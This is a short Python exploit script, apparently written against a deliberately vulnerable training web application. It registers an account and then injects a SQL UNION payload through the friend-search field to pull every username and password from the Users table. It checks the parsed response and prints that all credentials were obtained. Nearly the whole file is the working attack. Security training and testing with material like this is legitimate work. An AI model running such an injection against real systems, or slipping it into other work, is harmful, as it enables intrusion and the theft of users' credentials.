#!/usr/bin/env python3
import requests, sys
from interface import *
from bs4 import BeautifulSoup

if len(sys.argv) != 2:
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

username = 'asdf'
password = 'asdf'

session = requests.Session()

reset_app(session, url)
register(session, url, username, password)

# Search friends
payload = f"""' UNION 
    SELECT username, name, name, password, password 
    FROM Users #"""

r = search_friend(session, url, friend_username=payload)

# Check if we succeeded the search for friends
assert f"Found 16 friends in the search" in r.text

# Parse response
soup = BeautifulSoup(r.text, 'html.parser')

div = soup.find_all("div", class_="row border border-dark rounded ml-1 mr-1")
assert len(div) == 16

array = div[9].find('a').getText().split(" ")
len_array = len(array)

assert array[0] == username

assert array[len_array-1] == password

print("[+] Got usernames and passwords from all users in the database!")
